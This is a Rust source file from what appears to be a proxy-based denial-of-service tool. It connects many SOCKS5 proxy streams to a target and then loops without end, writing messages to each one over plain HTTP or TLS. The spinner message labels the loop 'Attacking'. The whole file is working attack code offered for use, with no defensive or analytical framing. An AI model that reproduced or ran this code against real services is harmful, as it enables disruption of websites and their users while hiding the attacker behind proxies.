use std::net::ToSocketAddrs;

use rustls::Stream;
use socks::Socks5Stream;
use spinners::{Spinner, Spinners};

use anyhow::Result;
use log::{debug, error, info};

use super::{socket::write_msg, tls::init_tls};

pub fn spawn_socks_clients_and_attack<T: ToSocketAddrs + std::fmt::Debug>(
    proxies: &[T],
    target: &str,
    sock_cnt: usize,
    http_only: bool,
) -> Result<()> {
    let mut proxies_spinner = Spinner::new(Spinners::Star, "Connecting proxy servers".into());

    let mut proxy_list = Sock5StreamCollections::new();
    let mut cnt = sock_cnt;
    while cnt > 0 {
        for proxy in proxies {
            match Socks5Stream::connect(proxy, target) {
                Ok(sock) => {
                    proxy_list.push(sock);
                }
                Err(e) => error!("Failed to connect to proxy server: {}", e),
            }
            cnt -= 1;
        }
        debug!("Socket count: {}", proxy_list.len());
        if cnt % 100 == 0 {
            info!("Socket count: {}", proxy_list.len());
        }
    }
    proxies_spinner.stop();
    info!("Connected to {} proxy servers", proxies.len());

    proxy_list.attack(target, http_only);
    Ok(())
}

pub struct Sock5StreamCollections {
    socks5_stream: Vec<Socks5Stream>,
}
impl Sock5StreamCollections {
    pub fn new() -> Self {
        Self {
            socks5_stream: Vec::new(),
        }
    }
    fn push(&mut self, stream: Socks5Stream) {
        self.socks5_stream.push(stream);
    }

    pub fn len(&self) -> usize {
        self.socks5_stream.len()
    }

    pub fn attack(&mut self, target: &str, http_only: bool) {
        Spinner::new(
            Spinners::BoxBounce2,
            "\x1b[31mAttacking... В действии...\x1b[m \x1b[36m\x1b[m".into(),
        );
        println!();

        let mut tls_client = init_tls(target);
        loop {
            let mut i = 0;
            while i < self.len() {
                if http_only {
                    match write_msg(&mut self.socks5_stream[i]) {
                        Ok(()) => {
                            i += 1;
                        }
                        Err(e) => {
                            debug!("Failed to write to socket: {}", e);
                            //self.socks5_stream.remove(i);
                        }
                    };
                } else {
                    let mut target = &self.socks5_stream[i];
                    let mut stream = Stream::new(&mut tls_client, &mut target);
                    match write_msg(&mut stream) {
                        Ok(()) => {
                            i += 1;
                        }
                        Err(e) => {
                            debug!("Failed to write to socket: {}", e);
                            //self.socks5_stream.remove(i);
                        }
                    };
                }
            }
        }
    }
}
